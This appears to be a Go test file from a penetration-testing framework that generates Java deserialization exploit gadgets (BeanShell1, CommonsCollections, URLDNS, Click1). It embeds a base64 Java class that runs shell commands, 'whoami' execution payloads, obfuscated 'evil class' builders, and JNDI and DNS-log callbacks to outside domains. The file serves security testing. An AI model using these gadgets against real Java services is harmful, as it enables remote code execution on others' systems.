package yso

import (
	"fmt"
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yserx"
	"testing"
)

func TestGenerateGadgetByGadgetName(t *testing.T) {
	gadget, err := GenerateGadget("BeanShell1", "script_base64", map[string]string{
		"script": "yv66vgAAADQAXgkAMwA0CAA1CgAEADYHADcIADgIADkJABsAOggAHQgAOwoAPAA9CgA8AD4HAD8KAAwAQAoAHABBCQAbAEIIAEMKABsARAgARQgAHwkAGwBGCABHCQAbAEgHAEkKABcAQQoAFwBKCgAXAEsHAEwHAE0BAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAhpc1N0YXRpYwEAA3llcwEABGZsYWcBAAVzdGFydAEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwBOBwA/AQAGPGluaXQ+BwBMAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKRXhjZXB0aW9ucwcATwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABBSdW50aW1lRXhlYy5qYXZhBwBQDABRAB4BAAEvDABSAFMBABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jDAAdAB4BAAIvQwcAVAwAVQBWDABXAFgBABNqYXZhL2lvL0lPRXhjZXB0aW9uDABZACMMACkAIwwAIQAeAQALaXNTdGF0aWNZZXMMACIAIwEAAmlkDAAfAB4BAANZZXMMACAAHgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABaAFsMAFwAXQEACENuSmlqU3ZwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE1tMamF2YS9sYW5nL1N0cmluZzsBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsAIQAbABwAAAAEAAoAHQAeAAAACgAfAB4AAAAKACAAHgAAAAoAIQAeAAAABQAJACIAIwABACQAAACZAAQAAgAAAEmyAAESArYAA5kAGwa9AARZAxIFU1kEEgZTWQWyAAdTS6cAGAa9AARZAxIIU1kEEglTWQWyAAdTS7gACiq2AAtXpwAITCu2AA2xAAEAOABAAEMADAACACUAAAAiAAgAAAAWAAsAFwAjABkAOAAdAEAAIABDAB4ARAAfAEgAIQAmAAAADgAEI/wAFAcAJ0oHACgEAAEAKQAjAAEAJAAAAEkAAgABAAAAEyq3AA6yAA8SELYAA5oABrgAEbEAAAACACUAAAASAAQAAAAnAAQAKAAPACkAEgAqACYAAAAMAAH/ABIAAQcAKgAAAAEAKwAsAAIAJAAAABkAAAADAAAAAbEAAAABACUAAAAGAAEAAAAtAC0AAAAEAAEALgABACsALwACACQAAAAZAAAABAAAAAGxAAAAAQAlAAAABgABAAAAMAAtAAAABAABAC4ACAAwACMAAQAkAAAAcAACAAAAAAA3EhKzAAcSE7MAFBIVswAWuwAXWbcAGLIAFLYAGbIAFrYAGbYAGrMAD7IADxIQtgADmQAGuAARsQAAAAIAJQAAAB4ABwAAABAABQARAAoAEgAPACMAKAAkADMAJQA2ACYAJgAAAAMAATYAAQAxAAAAAgAy",
	})
	if err != nil {
		t.Fatal(err)
	}
	ser, err := ToBytes(gadget)
	if err != nil {
		t.Fatal(err)
	}
	println(codec.EncodeBase64(ser))
}
func TestGenerateGadget(t *testing.T) {
	YsoConfigInstance, err := getConfig()
	if err != nil {
		t.Fatal(err)
	}
	for name, gadget := range YsoConfigInstance.Gadgets {
		if gadget.IsTemplateImpl {
			_, err = GenerateGadget(string(name), "RuntimeExec", "whoami")
			if err != nil {
				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
			}
		} else if gadget.Template == nil {
			gadget, err := GenerateGadget(string(name), "raw_cmd", "whoami")
			if err != nil {
				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
			}
			_ = gadget
		} else {
			_, err = GenerateGadget(string(name), YsoConfigInstance.Gadgets[name].ReferenceFun, map[string]string{
				"class":  "aaa",
				"domain": "aaa",
				"jndi":   "aa",
			})
			if err != nil {
				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
			}
		}
	}
}
func TestGenerateGadgetFunc(t *testing.T) {
	_, err := GenerateGadget("URLDNS", "dnslog", "rahtkbblhv.dgrh3.cn")
	if err != nil {
		t.Fatal(err)
	}
	_, err = GenerateGadget("URLDNS", "dnslog", map[string]string{
		"domain": "rahtkbblhv.dgrh3.cn",
	})
	if err != nil {
		t.Fatal(err)
	}

	_, err = GenerateGadget("CommonsCollections2", "Sleep", "1000")
	if err != nil {
		t.Fatal(err)
	}
	_, err = GenerateGadget("CommonsCollections2", "Sleep", map[string]string{
		"time": "1000",
	})
	if err != nil {
		t.Fatal(err)
	}

	_, err = GenerateGadget("CommonsCollections1", "jndi", "xxx.com")
	if err != nil {
		t.Fatal(err)
	}
	_, err = GenerateGadget("CommonsCollections1", "jndi", map[string]string{
		"jndi": "xxx.com",
	})
	if err != nil {
		t.Fatal(err)
	}

	_, err = GenerateGadget("SimplePrincipalCollection")
	if err != nil {
		t.Fatal(err)
	}

}
func TestMUSTPASSSetMajorVersion(t *testing.T) {
	type testCase struct {
		version     uint16
		className   string
		wantVersion uint16
	}
	handleJavaValue := func(value *yserx.JavaFieldValue, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		if value.Type != yserx.X_FIELDVALUE {
			return
		}

		array2, ok := value.Object.(*yserx.JavaArray)
		if !ok || !array2.Bytescode {
			return
		}
		handle(nil, array2)
	}
	handleJavaField := func(f yserx.JavaSerializable, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		field, ok := f.(*yserx.JavaFieldValue)
		if !ok || field.Type != yserx.X_FIELDVALUE {
			return
		}

		array, ok := field.Object.(*yserx.JavaArray)
		if !ok {
			return
		}

		for _, value := range array.Values {
			handleJavaValue(value, handle)
		}
	}
	handleJavaClassData := func(o yserx.JavaSerializable, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		data, ok := o.(*yserx.JavaClassData)
		if !ok {
			return
		}

		for _, f := range data.Fields {
			handleJavaField(f, handle)
		}
	}
	handleJavaSerializable := func(objSer yserx.JavaSerializable, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		obj, ok := objSer.(*yserx.JavaObject)
		if !ok {
			return
		}

		for _, o := range obj.ClassData {
			handleJavaClassData(o, handle)
		}
	}

	tests := []testCase{
		{version: 50, className: "TjftfYIA", wantVersion: 50},
		{version: 51, className: "TjftfYIA", wantVersion: 51},
		{version: 133, className: "TjftfYIA", wantVersion: 52},
		// Add more test cases as needed
	}

	for _, tc := range tests {
		t.Run(fmt.Sprintf("Version%d", tc.version), func(t *testing.T) {
			got, err := GetClick1JavaObject(
				SetRuntimeExecEvilClass("whoami"),
				SetObfuscation(),
				SetClassName(tc.className),
				SetMajorVersion(tc.version),
			)

			if err != nil {
				t.Errorf("GetClick1JavaObject() error = %v", err)
				return
			}
			g, _ := ToBytes(got)
			javaSerializables, err := yserx.ParseFromBytes(g)
			if err != nil {
				t.Errorf("ParseFromBytes() error = %v", err)
				return
			}

			found := false
			WalkJavaSerializableObject(javaSerializables, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
				// Assuming the WalkJavaSerializableObject and other functions are defined elsewhere
				handleJavaSerializable(objSer, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable) {
					javaClass, ok := objSer.(*yserx.JavaArray)
					if ok {
						obj, err := javaclassparser.Parse(javaClass.Bytes)
						if err == nil && obj.MajorVersion == tc.wantVersion {
							found = true
						}
					}
				})
			})

			if !found {
				t.Errorf("Test case with version %d failed, expected major version was %d", tc.version, tc.wantVersion)
			}

			var found2 bool
			got2, err := GenerateProcessBuilderExecEvilClassObject("whoami",
				SetObfuscation(),
				SetClassName(tc.className),
				SetMajorVersion(tc.version),
			)

			if err != nil {
				t.Errorf("GenerateProcessBuilderExecEvilClassObject() error = %v", err)
				return
			}
			g2, _ := ToBytes(got2)

			version := g2[7]
			if uint16(version) == tc.wantVersion {
				found2 = true
			}
			if !found2 {
				t.Errorf("Test case with version %d failed, expected major version was %d", tc.version, tc.wantVersion)
			}

		})
	}
}
